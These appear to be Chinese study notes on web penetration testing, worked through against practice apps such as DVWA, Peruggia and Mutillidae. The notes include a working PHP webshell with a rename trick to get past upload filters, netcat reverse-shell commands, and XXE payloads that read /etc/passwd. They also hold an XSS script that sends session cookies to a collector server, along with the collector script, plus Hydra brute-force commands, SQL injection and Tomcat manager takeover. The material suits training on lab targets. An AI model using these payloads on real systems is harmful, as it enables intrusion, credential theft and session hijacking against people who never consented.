### 简介

这章开始我们会开始涉及渗透测试的的利用层面。和漏洞评估的主要不同是，漏洞评估中测试者识别漏洞（多数时间使用自动化扫描器）和提出如何减轻它们的建议。而渗透测试中测试者作为恶意攻击者并尝试利用检测到的漏洞，并得到最后的结果：整个系统的沦陷，内部网络访问，敏感数据泄露，以及其它。同时，要当心不要影响系统的可用性或者为真正的攻击者留下后门。





### 1. 恶意使用文件包含和上传



##### 操作步骤

1. 准备好webshell

```php
// webshell.php  查了一趟之后，发现表单应该用get而不是post，因为第一条命令需要获取get的参数。。
<?
system($_GET['cmd'];
echo '<form method="get" action="../../hackable/uploads/webshell.php"><input type="text" name="cmd"/></form>';
?>
// rename.php
<? 
system('mv ../../hackable/uploads/webshell.jpg ../../hackable/uploads/webshell.php'); 
?>
    
```

2. 上传webshell，因为一般会有文件扩展名进行校验，因此对后缀进行修改

```shell
cp rename.php rename.jpg
cp webshell.php webshell.jpg
```

3. 上传两个文件
4. 通过`RFI`，先访问`rename.jpg`然后访问 `webshell.php`
5. 在页面或者拼接GET请求参数，传参到webshell中执行cmd命令



##### 工作原理

在上传有效 JPG 文件时，我们所做的第一个测试是为了发现上传文件保存的路径，便于我们可以在`rename.php`中，以及表单的`action`中使用这个路径。

使用重命名脚本有两个重要原因：首先，上传页面只允许 JPG 文件，所以我们的脚本需要这个扩展名，其次，我们需要带参数调用我们的 webshell（要执行的命令），而我们从 Web 服务器调用图片时不能带参数。

PHP 中的`system()`函数是攻击核心，它所做的是，执行系统命令并显示输出。这允许我们将 webshell 文件从`.jpg`重命名为`.php`文件并执行我们指定为 GET 参数的命令。



##### 更多

使用`Netcat`反向连接。

```shell
# 在源计算机端口8181开启Netcat侦听器
nc -lp 8181 
# 使用已经建立的后门shell连接，启动反弹TCP请求
backdoor_reversetcp 源ip 8181
```

通过反弹TCP Shell控制服务器，而访问或错误日志中没有任何痕迹，因为通信在TCP而不是在HTTP。





### 2. 利用OS命令注入



##### 操作步骤

1. 在能执行命令的漏洞中，或许使用上面的webshell漏洞
2. 通过Netcat连接到服务器

```shell
# 主机打开监听
nc -lp 1691 -v
# 目标执行反向连接
nc.traditional -e /bin/bash 主机 1691
```



**但是此处尝试连接不上。**



##### 工作原理

就像 SQL 注入的例子那样，命令注入漏洞的来源于弱输入校验机制，以及使用用户提供的数据来拼接之后会用做 OS 命令的字符串。如果我们查看刚刚攻击的页面源代码（每个 DVWA 页面的右下角会有个按钮），会看到这些：

```php
<?php
if( isset( $_POST[ 'submit' ] ) ) {

    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.    
    if (stristr(php_uname('s'), 'Windows NT')) {
        $cmd = shell_exec( 'ping  ' . $target );        
        echo '<pre>'.$cmd.'</pre>';            

    } else {             
        $cmd = shell_exec( 'ping  -c 3 ' . $target );        
        echo '<pre>'.$cmd.'</pre>';        
    }    
} 
?>
```

我们可以看到，它直接将用户的输入附加到 ping 命令后面。我们所做的仅仅是添加一个分号，系统的 shell 会将其解释为命令的分隔符，以及下一个我们打算执行的命令。

在成功执行命令之后，下一步就是验证服务器是否拥有 Netcat。它是一个能够建立网络连接的工具，在一些版本中还可以在新连接建立之后执行命令。我们看到了服务器的系统拥有两个不同版本的 Netcat，并执行了我们已知支持所需特性的版本。

之后我们配置攻击系统来监听 TCP 1691 端口连接（也可以是任何其它可用的 TCP 端口），然后我们让服务器连接到我们的机器，通过该端口并在连接建立时执行`/bin/bash`（系统 shell）。所以我们通过连接发送的任何东西都会被服务器接收作为 shell 的输入。

也可以让服务器下载一些恶意程序，例如提权利用，执行它来获得更高权限。







### 3. 利用XML外部实体注入

XML 是主要用于描述文档或数据结构的格式，例如，HTML 是XML 的实现，它定义了页面和它们的关系的结构和格式。

XML 实体类似于定义在 XML 结构中的数据结构，它们中的一些能够从文件系统中读取文件或者甚至是执行命令。



##### 操作步骤

1. 在xml文件使用上。这里是使用xml校验器

```xml
# 常规xml
<somexml><message>Hello World</message></somexml>
# 使用实体
<!DOCTYPE person [  
    <!ELEMENT person ANY>  
    <!ENTITY person "Mr Bob"> 
]> 
<somexml><message>Hello World &person;</message></somexml>
# 使用外部实体
<!DOCTYPE fileEntity [  
    <!ELEMENT fileEntity ANY>  
    <!ENTITY fileEntity SYSTEM "file:///etc/passwd"> 
]> 
<somexml><message>Hello World &fileEntity;</message></somexml>
# 使用XEE加载页面
<!DOCTYPE fileEntity [ 
    <!ELEMENT fileEntity ANY> 
    <!ENTITY fileEntity SYSTEM "http://192.168.56.102/dvwa/hackable/uploads/webshell.php?cmd=/sbin/ifconfig"> 
]> 
<somexml><message>Hello World &fileEntity;</message></somexml>
```





##### 工作原理

XML 拥有叫做实体的特性。XML 实体是与值关联的名称，每次实体在文档中使用的时候，它都会在 XML文件处理时替换为值。使用它以及不同的可用包装器**（`file://`来加载系统文件，或者`http://`来加载 URL）**，我们就可以通过输入校验和XML 解析器的配置，恶意使用没有合理安全措施的实现，并提取敏感数据或者甚至在服务器中执行系统命令。

这个秘籍中，我们使用`file://`包装器来使解析器加载服务器中的任意文件，之后，使用`http://`包装器，我们调用了网页，它碰巧是同一个服务器中的 webshell，并执行了一些命令。





### 4. 使用Hydra爆破密码

文档太久了：找了个新的[黑客工具之hydra详细使用教程](https://zhuanlan.zhihu.com/p/397779150)

Hydra 是网络登录破解器，也就是在线的破解器，这意味着它可以用于通过爆破网络服务来发现登录密码。

准备一些用户名、密码组合可以减少破解时间



##### 操作步骤

1. 分析请求如何发送，以及服务器如何响应。使用Burp Suite抓包
2. 例子请求`/dvwa/login.php`,能看见请求参数是`username`,`password`,`login`
3. 请求后会有一个重定向页面的响应。成功会跳到可能`index.php`, 失败则是回到原来`login.php`
4. hydra攻击

```shell
hydra -L 密码文件 -e ns -u -t 2 -w 30 -o 输出结果文件 ip地址 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:login.php"
```



##### 工作原理

这个秘籍的第一个部分是捕获和分析请求，用于了解请求如何工作。如果我们考虑登录页面的输出，我们会看到消息“登录失败”，并且可以使用这个消息作为 Hydra的输入来充当失败的字符串。但是，通过检查代理的历史，**我们可以看到它出现在重定向之后，Hydra只读取第一个响应，所以它并不能用，这也是我们使用`login.php`作为失败字符串的原因。**

我们使用了多个参数来调用 Hydra：

- ip地址后跟着协议，这里用的HTTP表单POST请求
- 然后再跟着请求路径拼接，用户密码参数后要用`^USER^`和`^PASS^`表示
- `"uri:请求表单拼接:筛选失败内容"` 这里筛选只能取第一个响应结果内的。
- `-L` 代表密码文件
- `-e ns`尝试使用空密码，并将用户名作为密码
- `-u`首先迭代用户名
- `-t`线程数量
- `-w`超时时间
- `-o`输出文件



##### 更多

要注意我们没有使用`-P`选项来使用密码列表，或者`-x`选项来自动生成密码。我们这样做是因为爆破 Web 表单产生很大的网络流量，如果服务器对它没有防护，会产生 DoS 的情况。

不推荐使用大量的密码在生产服务器上执行爆破或字典攻击，因为我们会使服务器崩溃，阻拦有效用户，或者被客户端的保护机制阻拦。

推荐渗透测试者在执行这种攻击时对每个用户尝试四次，来避免被阻拦。例如，我们可以尝试`-e ns`，就像这里做的这样，之后添加`-p 123456`来测试三种可能性，没有密码、密码和用户名一样以及密码为`123456`，这是世界上最常见的密码之一。



### 5. 使用Burp Suite执行登录页面的字典爆破



##### 操作步骤

1. 使用Burp Suite抓包
2. 将想要爆破的请求点击`Send to intruder`
3. 在`Inturder`的标签页中，先clear爆破字段，然后根据需要，选择单个`Sniper`,多个`Cluster bomb`参数爆破
4. 然后到`Payloads`根据字段需要选择是遍历数字还是遍历文档列表



##### 工作原理

Intruder 所做的是，修改请求的特定部分，并使用定义好的载荷替换这些部分的值。载荷可以是这些东西：

- 简单列表：来自文件，由剪贴板传递或者写在文本框中的列表。
- 运行时文件：Intruder 可以在运行时从文件中读取载荷，所以如果文件非常大，它不会完全加载进内存。
- 数字：生成一列顺序或随机的数字，以十进制或十六进制形式。
- 用户名生成器：接受邮件地址列表，从中提取可能的用户。
- 爆破器：接受字符集并使用它来生成指定长度的所有排列。

这些载荷由Intruder以不同形式发送，在`Positions`标签页中由攻击类型指定。攻击类型在载荷标记中的组合和排列方式上有所不同。

- Sniper：对于载荷的单一集合，它将每个载荷值放在每个标记位置，一次一个。
- Battering ram：类似Sniper，它使用载荷的单一集合，不同点是它在每个请求中将所有位置设置为相同的值。
- Pitchfork：使用多个载荷集合，并将每个集合中的一个项目放到每个标记位置中。当我们拥有不能混用的预定义数据时，这会非常有用，例如，测试已知的用户名和密码。
- Cluster bomb：测试多个载荷，所以每个可能的排列都可以测试到。

对于结果，我们可以看到所有失败尝试都有相同的响应，这里是 811 字节。所以我们假设成功响应的长度应该不同（因为它会重定向到用户主页）。如果碰巧成功和失败请求长度相同，我们也可以检查状态码或者使用搜索框来寻找响应中的特定模式。



##### 更多

kali 包含了非常实用的密码字典和单词列表集合，位于`/usr/ share/wordlists`。一些文件可以在这里找到：

- `rockyou.txt`：Rockyou.com在 2010 年被攻破，泄露了多于 14 亿的密码，这个列表包含它们。
- `dnsmap.txt`：包含常用的子域名称，例如内部网络、FTP或者WWW。在我们爆破 DNS 服务器时非常实用。
- `./dirbuster/*`：`dirbuster`目录包含Web 服务器中常见的文件名称，这些文件可以在使用`DirBuster`或 OWASP ZAP 强制浏览时使用。
- `./wfuzz/*`：在这个目录中，我们可以找到用于Web 攻击的模糊字符串的大量集合，以及爆破文件





### 6.  通过 XSS 获得会话 Cookie

这个秘籍中，我们会利用持久性 XSS 来获得用户的会话 Cookie，之后使用这个 cookie 来通过移植到另一个浏览器来劫持会话，之后冒充用户来执行操作。



##### 操作步骤

1. 先启动一个web服务，用于收集cookie，先启动Apache

```shell
service apache2 start
```

2. 先生成一个写入cookie的php脚本

```php
<?php 
$fp = fopen('/tmp/cookie_data.txt', 'a'); 
fwrite($fp, $_GET["cookie"] . "\n"); 
fclose($fp); 
?>
```

这个脚本会收集get请求后缀里面的`cookie`参数，然后写入到文件。

3. 在`/peruggia/`中，点击`comment on this picture`添加评论
4. 加入xss代码,点击post

```html
<script> 
    var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open( "GET", "http://192.168.56.1/savecookie.php?cookie=" + document.cookie, true ); 
    xmlHttp.send( null ); 
</script>
```

5. 当受害者登录状态访问该页面，xss就会获取cookie并且请求收集服务器地址的php写入cookie
6. 根据cookie文件内容，使用`Cookies Manager+`，编辑`PHPSESSID`cookie，然后就能使用受害者身份登录。



##### 工作原理

简单来说，我们使用应用中的 XSS 漏洞来将会话 Cookie 发送给远程服务器，通过 JavaScript HTTP 请求。这个服务器被配置用于储存会话 Cookie，之后，我们获得一个会话 ID，并把它移植到不同的浏览器中来劫持验证用户的会话。下面，我们来看看每一步如何工作。

我们编写的 PHP 文件用于在 XSS 攻击执行时保存收到的 COokie。

我们输入的评论是一个脚本，使用JavaScript 的XMLHttpRequest 对象来向我们的恶意服务器发送 HTTP 请求，这个请求由两步构建：

```js
xmlHttp.open( "GET", "http://192.168.56.1/savecookie.php?cookie=" + document.cookie, true );
```

我们使用 GET 方法打开请求，向`http://192.168.56.1/savecookie.php` URL添加叫做`cookie`的参数，它的值储存在`document.cookie`中，它是 JavaScript 中储存cookie值的变量。最后的参数设置为`true`，告诉浏览器这是异步请求，这意味着它不需要等待响应。

```js
xmlHttp.send( null )
```

最后的指令将请求发送给服务器。

在管理员登录并查看包含我们所发送评论的页面之后，脚本会执行，并且管理员的会话 cookie 就储存在我们的服务器中了。

最后，一旦我们获得了有效用户的会话 cookie，我们可以在浏览器中替换我们自己的会话 cookie，之后重新加载页面来执行操作，就像我们是这个用户一样。





### 7. 逐步执行基本的 SQL 注入





##### 工作原理

在我们的第一次注入，`1' order by 1 -- '`到`1' order by 3 -- '`中，我们使用 SQL 语言的特性，它允许我们通过特定的字段或类，使用它的编号来排列结果。我们用它来产生错误，于是能够知道查询一共有多少列，便于我们将其用于创建 UNION 查询。

UNION 查询语句用于连接两个拥有相同列数量的查询，通过注入这些我们就可以查询数据库中几乎所有东西。这个秘籍中，我们首先检查了它是否像预期一样工作，之后我们将目标设置为`users`表，并设法获得它。

第一步是弄清数据库和表的名称，我们通过查询`information_schema`数据库来实现，它是 MySQL 中储存所有数据库、表和列信息的数据库。

一旦我们知道了数据库和表的名称，我们在这个表中查询所有列，来了解我们需要查找哪一列，它的结果是`user`和`password`。

最后，我们注入查询来请求`dvwa`数据库的`users`表中的所有用户名和密码





### 8。 使用SQLMap发现和利用SQL注入



##### 工作原理

SQLMap 会使用 SQL 注入字符串，对给定 URL 和数据的输入进行模糊测试，或者只针对`-p`选项中的特定目标，并且解释其响应来发现是否存在漏洞。不要模糊测试所有输入，最好使用 SQLMap 来利用我们已知存在的注入，并始终尝试缩小搜索过程，通过提供所有可用的信息，例如漏洞参数、DBMS 类型，以及其它。在所有可能性下寻找注入会花费大量时间，并在网络中产生非常大的流量。

这个秘籍中，我们已经知道了用户名参数存在注入漏洞（因为我们使用了 Mutillidae 的注入测试页面）。在第一个攻击中，我们只希望确认注入是否存在，并询问一些非常基本的信息：用户名（`--curent-user`）和数据库名称（`--current-db`）。

在第二个攻击中，我们使用`-D`选项，以及前一次攻击所获得的名称，指定希望查询的数据库，我们也使用`--tables`询问了所包含的表名称。

知道我们希望获得哪个表（`-T accounts`）之后，我们告诉 SQLMap 使用`--dump`转储它的内容





### 9. 使用Metasploit攻击Tomcat的密码

Apache Tomcat，是世界上最广泛使用的 Java Web 服务器之一。带有默认配置的 Tomcat 服务器非常容易发现。发现暴露 Web 应用管理器的服务器也非常容易，它是一个应用，允许管理员启动、停止、添加和删除服务器中的应用。





##### 工作原理

通常 Tomcat 使用 TCP 8080，它的管理器应用位于`/manager/html`中。这个应用使用基本的 HTTP 验证。我们刚刚使用的 Metasploit 辅助模块（`tomcat_mgr_login`）有一些值得提及的配置项：

- `BLANK_PASSWORDS`：对每个尝试的用户添加空密码测试。
- `PASSWORD`：如果我们打算测试多个用户的单一密码，或者添加列表中没有包含的项目，这就很实用。
- `PASS_FILE`：用于测试的密码列表。
- `Proxies`：如果我们需要通过代理来访问我们的目标，或者避免检测，就用这个选项。
- `RHOSTS`：单个主机，或多个（使用空格分隔），或者我们想要测试的主机列表文件（`/path/to/file/with/hosts`）。
- `RPORT`：Tomcat 所使用的 TCP 端口。
- `STOP_ON_SUCCESS`：发现有效密码之后停止尝试。
- `TARGERURI`：主机中管理器应用的位置。
- `USERNAME`指定特殊的用户名来测试，它可以被单独测试，或者添加到定义在`USER_FILE`的列表中。
- `USER_PASS_FILE`：包含要被测试的“用户名 密码”组合的文件。
- `USER_AS_PASS`：将每个列表中的用户名作为密码尝试。





### 10. 使用Tomcat管理器来执行代码





##### 工作原理

一旦我们获得了 Tomcat 管理器的身份认证，攻击过程就相当直接了。我们仅仅需要足以让我们上传它的应用。Laudanum 默认包含在 Kali 中，是多种语言和类型的 webshell 的集合，包括 PHP、ASP、 ASP.NET 和 JSP。对渗透测试者来说，什么比 webshell 更有用呢？

Tomcat 能够接受以 WAR（Web 应用归档）格式打包的 Java Web 应用并将其部署到服务器上。我们刚刚使用了这一特性来上传 Laudanum 中的 webshell。在它上传和部署之后，我们浏览它并且通过执行系统命令，我们发现我们拥有这个系统的 root 访问。